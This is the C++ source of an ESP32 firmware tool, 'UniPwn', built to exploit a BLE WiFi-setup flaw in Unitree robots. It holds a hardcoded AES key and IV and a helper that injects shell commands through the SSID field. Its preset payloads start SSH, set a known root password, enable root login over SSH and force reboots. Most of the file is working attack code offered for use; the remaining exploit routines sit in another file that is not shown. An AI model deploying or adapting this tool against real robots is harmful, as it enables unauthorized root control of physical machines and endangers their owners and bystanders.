/*
 * ESP32-S3 Unitree Robot BLE Exploit Tool

 * 
 * This tool exploits the BLE WiFi configuration vulnerability
 * in Unitree robots (Go2, G1, H1, B2 series)
 */

#include "config.h"
// Use built-in ESP32 BLE stack for better compatibility
#include "BLEDevice.h"
#include "BLEClient.h"
#include "BLEScan.h"
#include "BLEAdvertisedDevice.h"
#include "BLERemoteCharacteristic.h"
#include <WiFi.h>
#include <SPIFFS.h>
#include <ArduinoJson.h>
#include <mbedtls/aes.h>
#include <vector>
#include <map>
#include <algorithm>

// UUIDs from original Python code
#define DEVICE_NAME_UUID        "00002a00-0000-1000-8000-00805f9b34fb"
#define CUSTOM_CHAR_UUID        "0000ffe1-0000-1000-8000-00805f9b34fb"
#define CUSTOM_CHAR_UUID_2      "0000ffe2-0000-1000-8000-00805f9b34fb"
#define UNITREE_SERVICE_UUID    "0000ffe0-0000-1000-8000-00805f9b34fb"

// Configuration
#define SCAN_TIME_SECONDS 30
#define CHUNK_SIZE 14
#define MAX_RECENT_DEVICES 5

// Hardcoded AES parameters (from reverse engineering)
const uint8_t AES_KEY[16] = {
    0xdf, 0x98, 0xb7, 0x15, 0xd5, 0xc6, 0xed, 0x2b,
    0x25, 0x81, 0x7b, 0x6f, 0x25, 0x54, 0x12, 0x4a
};

const uint8_t AES_IV[16] = {
    0x28, 0x41, 0xae, 0x97, 0x41, 0x9c, 0x29, 0x73,
    0x29, 0x6a, 0x0d, 0x4b, 0xdf, 0xe1, 0x9a, 0x4f
};

const String HANDSHAKE_CONTENT = "unitree";
const String COUNTRY_CODE = "US";

// Predefined commands
struct Command {
    String name;
    String cmd;
    String description;
};

std::vector<Command> predefinedCmds = {
    {"enable_ssh", "/etc/init.d/ssh start", "Enable SSH access"},
    {"change_root_pwd", "echo 'root:Bin4ryWasHere'|chpasswd;sed -i 's/^#*\\s*PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config;", "Change root password"},
    {"get_serial", "cat /sys/class/dmi/id/product_serial", "Get robot serial number"},
    {"reboot", "reboot -f", "Reboot the robot"},
    {"get_info", "cat /etc/os-release && uname -a", "Get system information"}
};

// Device structure
struct UnitreeDevice {
    String address;
    String name;
    int rssi;
    unsigned long lastSeen;
};

// Global variables
std::vector<UnitreeDevice> discoveredDevices;
std::vector<UnitreeDevice> recentDevices;
BLEClient* pClient = nullptr;
BLERemoteCharacteristic* pWriteChar = nullptr;
BLERemoteCharacteristic* pNotifyChar = nullptr;
bool deviceConnected = false;
bool verbose = false;
std::vector<uint8_t> receivedNotification;
bool notificationReceived = false;
std::map<uint8_t, std::vector<uint8_t>> serialChunks;

// Function declarations
void styledPrint(const String& message, bool verboseOnly = false);
String buildPwn(const String& cmd);
std::vector<uint8_t> encryptData(const std::vector<uint8_t>& data);
std::vector<uint8_t> decryptData(const std::vector<uint8_t>& data);
std::vector<uint8_t> createPacket(uint8_t instruction, const std::vector<uint8_t>& dataBytes = {});
bool genericResponseValidator(const std::vector<uint8_t>& response, uint8_t expectedInstruction);
void scanForDevices();
void displayMenu();
void handleMenuChoice(int choice);
bool connectToDevice(const UnitreeDevice& device);
void exploitDevice(const String& ssid, const String& password);
void loadRecentDevices();
void saveRecentDevices();
void addRecentDevice(const UnitreeDevice& device);
bool executeCommand(const UnitreeDevice& device, const String& command);

void setup() {
    Serial.begin(115200);
    while (!Serial) delay(10);
    
    // Initialize SPIFFS for device history
    if (!SPIFFS.begin(true)) {
        styledPrint("[-] SPIFFS initialization failed");
    }
    
    // Load recent devices
    loadRecentDevices();
    
    // Initialize BLE
    BLEDevice::init("ESP32-UniPwn");
    
    // Display banner
    Serial.println("\n\033[1;32m");
    Serial.println("+=======================================+");
    Serial.println("|   OUI Spy - UniPwn Edition           |");
    Serial.println("| Unitree Robot BLE Exploit Platform   |");
    Serial.println("| Go2, G1, H1, B2 Series Support       |");
    Serial.println("+=======================================+");
    Serial.println("  Based on: github.com/Bin4ry/UniPwn");
    Serial.println("  Research by Bin4ry & h0stile - 2025");
    Serial.println("\033[0m");
    
#if ENABLE_WEB_INTERFACE
    setupWebInterface();
#endif
    
    displayMenu();
}

void loop() {
#if ENABLE_WEB_INTERFACE
    handleWebInterface();
#endif
    
    if (Serial.available()) {
        int choice = Serial.parseInt();
        if (choice > 0) {
            handleMenuChoice(choice);
            displayMenu();
        }
    }
    delay(10);
}

void styledPrint(const String& message, bool verboseOnly) {
    if (verboseOnly && !verbose) return;
    Serial.print("\033[1;32m[//]\033[0m ");
    Serial.println(message);
}

String buildPwn(const String& cmd) {
    return "\";$(" + cmd + ");#";
}

std::vector<uint8_t> encryptData(const std::vector<uint8_t>& data) {
    std::vector<uint8_t> encrypted(data.size());
    mbedtls_aes_context aes_ctx;
    size_t offset = 0;
    uint8_t iv_copy[16];
    
    // Copy IV since it gets modified
    memcpy(iv_copy, AES_IV, 16);
    
    mbedtls_aes_init(&aes_ctx);
    mbedtls_aes_setkey_enc(&aes_ctx, AES_KEY, 128);
    mbedtls_aes_crypt_cfb128(&aes_ctx, MBEDTLS_AES_ENCRYPT, data.size(), 
                             &offset, iv_copy, data.data(), encrypted.data());
    mbedtls_aes_free(&aes_ctx);
    
    return encrypted;
}

std::vector<uint8_t> decryptData(const std::vector<uint8_t>& data) {
    std::vector<uint8_t> decrypted(data.size());
    mbedtls_aes_context aes_ctx;
    size_t offset = 0;
    uint8_t iv_copy[16];
    
    // Copy IV since it gets modified
    memcpy(iv_copy, AES_IV, 16);
    
    mbedtls_aes_init(&aes_ctx);
    mbedtls_aes_setkey_enc(&aes_ctx, AES_KEY, 128);
    mbedtls_aes_crypt_cfb128(&aes_ctx, MBEDTLS_AES_DECRYPT, data.size(), 
                             &offset, iv_copy, data.data(), decrypted.data());
    mbedtls_aes_free(&aes_ctx);
    
    return decrypted;
}

std::vector<uint8_t> createPacket(uint8_t instruction, const std::vector<uint8_t>& dataBytes) {
    std::vector<uint8_t> instructionData = {instruction};
    instructionData.insert(instructionData.end(), dataBytes.begin(), dataBytes.end());
    
    uint8_t length = instructionData.size() + 3;
    std::vector<uint8_t> fullData = {0x52, length};
    fullData.insert(fullData.end(), instructionData.begin(), instructionData.end());
    
    // Calculate checksum
    uint8_t checksum = 0;
    for (uint8_t b : fullData) {
        checksum += b;
    }
    checksum = (~checksum + 1) & 0xFF; // Two's complement
    
    fullData.push_back(checksum);
    return encryptData(fullData);
}

bool genericResponseValidator(const std::vector<uint8_t>& response, uint8_t expectedInstruction) {
    if (response.size() < 5) {
        styledPrint("[-] Response packet too short");
        return false;
    }
    
    if (response[0] != 0x51) {
        styledPrint("[-] Invalid opcode in response");
        return false;
    }
    
    if (response.size() != response[1]) {
        styledPrint("[-] Packet length mismatch");
        return false;
    }
    
    if (response[2] != expectedInstruction) {
        styledPrint("[-] Instruction mismatch: Expected " + String(expectedInstruction) + 
                   ", Got " + String(response[2]));
        return false;
    }
    
    // Verify checksum
    uint8_t expectedChecksum = 0;
    for (size_t i = 0; i < response.size() - 1; i++) {
        expectedChecksum += response[i];
    }
    expectedChecksum = (~expectedChecksum + 1) & 0xFF;
    
    if (response[response.size() - 1] != expectedChecksum) {
        styledPrint("[-] Checksum failure");
        return false;
    }
    
    return response[3] == 0x01;
}

void displayMenu() {
    Serial.println("\n\033[1;33m=== OUI Spy UniPwn Menu ===\033[0m");
    Serial.println("1. Scan for Unitree robots");
    Serial.println("2. Show recent targets");
    Serial.println("3. Connect and exploit target");
    Serial.println("4. Toggle verbose mode (current: " + String(verbose ? "ON" : "OFF") + ")");
    Serial.println("5. Show attack vectors");
    Serial.println("6. System information");
#if ENABLE_WEB_INTERFACE
    Serial.println("7. Web interface info");
#endif
    Serial.print("\n\033[1;32m[//] Enter choice: \033[0m");
}

void handleMenuChoice(int choice) {
    switch (choice) {
        case 1:
            scanForDevices();
            break;
        case 2:
            showRecentDevices();
            break;
        case 3:
            selectAndExploitDevice();
            break;
        case 4:
            verbose = !verbose;
            styledPrint("Verbose mode " + String(verbose ? "enabled" : "disabled"));
            break;
        case 5:
            showPredefinedCommands();
            break;
        case 6:
            showSystemInfo();
            break;
#if ENABLE_WEB_INTERFACE
        case 7:
            showWebInterfaceInfo();
            break;
#endif
        default:
            styledPrint("[-] Invalid choice");
            break;
    }
}

// BLE Scan callback
class MyAdvertisedDeviceCallbacks: public BLEAdvertisedDeviceCallbacks {
    void onResult(BLEAdvertisedDevice advertisedDevice) {
        String deviceName = advertisedDevice.getName().c_str();
        
        // Check if it's a Unitree device
        if (deviceName.startsWith("G1_") || deviceName.startsWith("Go2_") || 
            deviceName.startsWith("B2_") || deviceName.startsWith("H1_") || 
            deviceName.startsWith("X1_")) {
            
            UnitreeDevice device;
            device.address = advertisedDevice.getAddress().toString().c_str();
            device.name = deviceName;
            device.rssi = advertisedDevice.getRSSI();
            device.lastSeen = millis();
            
            // Check if already in list
            bool found = false;
            for (auto& d : discoveredDevices) {
                if (d.address == device.address) {
                    d.rssi = device.rssi;  // Update RSSI
                    d.lastSeen = device.lastSeen;
                    found = true;
                    break;
                }
            }
            
            if (!found) {
                discoveredDevices.push_back(device);
                styledPrint("Found: " + device.name + " (" + device.address + ") RSSI: " + String(device.rssi));
            }
        }
    }
};

void scanForDevices() {
    styledPrint("Scanning for Unitree devices...");
    discoveredDevices.clear();
    
    BLEScan* pBLEScan = BLEDevice::getScan();
    pBLEScan->setAdvertisedDeviceCallbacks(new MyAdvertisedDeviceCallbacks());
    pBLEScan->setActiveScan(true);
    pBLEScan->setInterval(100);
    pBLEScan->setWindow(99);
    
    BLEScanResults* foundDevices = pBLEScan->start(SCAN_TIME_SECONDS, false);
    pBLEScan->clearResults();
    
    styledPrint("Scan complete. Found " + String(discoveredDevices.size()) + " Unitree devices");
}

void showRecentDevices() {
    if (recentDevices.empty()) {
        styledPrint("No recent devices found");
        return;
    }
    
    styledPrint("Recent devices:");
    for (size_t i = 0; i < recentDevices.size(); i++) {
        Serial.println("  " + String(i + 1) + ". " + recentDevices[i].name + 
                      " (" + recentDevices[i].address + ")");
    }
}

void showPredefinedCommands() {
    styledPrint("Available predefined commands:");
    for (size_t i = 0; i < predefinedCmds.size(); i++) {
        Serial.println("  " + String(i + 1) + ". " + predefinedCmds[i].name + 
                      " - " + predefinedCmds[i].description);
    }
}

void showSystemInfo() {
    styledPrint("OUI Spy UniPwn System Information:");
    Serial.println("  Chip model: " + String(ESP.getChipModel()));
    Serial.println("  Chip revision: " + String(ESP.getChipRevision()));
    Serial.println("  Flash size: " + String(ESP.getFlashChipSize() / 1024 / 1024) + " MB");
    Serial.println("  Free heap: " + String(ESP.getFreeHeap() / 1024) + " KB");
    Serial.println("  Free PSRAM: " + String(ESP.getFreePsram() / 1024) + " KB");
    Serial.println("  MAC address: " + WiFi.macAddress());
    Serial.println("  Uptime: " + String(millis() / 1000 / 60) + " minutes");
#if ENABLE_WEB_INTERFACE
    Serial.println("  Web interface: ENABLED");
    Serial.println("  Access URL: http://192.168.4.1");
#else
    Serial.println("  Web interface: DISABLED");
#endif
}

#if ENABLE_WEB_INTERFACE
void showWebInterfaceInfo() {
    styledPrint("🌐 OUI Spy Web Interface Information:");
    Serial.println("  Status: ACTIVE");
    Serial.println("  SSID: " + String(WIFI_AP_SSID) + WiFi.macAddress().substring(9));
    Serial.println("  Password: " + String(WIFI_AP_PASSWORD));
    Serial.println("  URL: http://192.168.4.1");
    Serial.println("  Features: Professional UI, Real-time scanning,");
    Serial.println("           Attack automation, Target management");
    styledPrint("Connect any device to the WiFi and browse to the URL");
}
#endif

// Storage functions for recent devices
void loadRecentDevices() {
    if (!SPIFFS.exists("/recent_devices.json")) return;
    
    File file = SPIFFS.open("/recent_devices.json", "r");
    if (!file) return;
    
    DynamicJsonDocument doc(2048);
    deserializeJson(doc, file);
    file.close();
    
    JsonArray devices = doc["devices"];
    for (JsonObject device : devices) {
        UnitreeDevice d;
        d.address = device["address"].as<String>();
        d.name = device["name"].as<String>();
        d.lastSeen = device["lastSeen"];
        recentDevices.push_back(d);
    }
}

void saveRecentDevices() {
    DynamicJsonDocument doc(2048);
    JsonArray devices = doc.createNestedArray("devices");
    
    for (const auto& device : recentDevices) {
        JsonObject d = devices.createNestedObject();
        d["address"] = device.address;
        d["name"] = device.name;
        d["lastSeen"] = device.lastSeen;
    }
    
    File file = SPIFFS.open("/recent_devices.json", "w");
    if (file) {
        serializeJson(doc, file);
        file.close();
    }
}

void addRecentDevice(const UnitreeDevice& device) {
    // Remove if already exists
    recentDevices.erase(
        std::remove_if(recentDevices.begin(), recentDevices.end(),
                      [&](const UnitreeDevice& d) { return d.address == device.address; }),
        recentDevices.end());
    
    // Add to front
    recentDevices.insert(recentDevices.begin(), device);
    
    // Keep only last 5
    if (recentDevices.size() > MAX_RECENT_DEVICES) {
        recentDevices.resize(MAX_RECENT_DEVICES);
    }
    
    saveRecentDevices();
}

bool executeCommand(const UnitreeDevice& device, const String& command) {
    Serial.println("[EXPLOIT] Executing command on " + device.address + ": " + command);
    
    if (!connectToDevice(device)) {
        Serial.println("[EXPLOIT] Failed to connect to device");
        return false;
    }
    
    // Build the exploit payload with the command
    String ssid = buildPwn(command);
    String password = "testpassword";
    
    // Execute the exploit
    exploitDevice(ssid, password);
    
    // Disconnect
    if (pClient && pClient->isConnected()) {
        pClient->disconnect();
    }
    
    Serial.println("[EXPLOIT] Command execution completed");
    return true;
}

// selectAndExploitDevice() is implemented in exploitation.ino
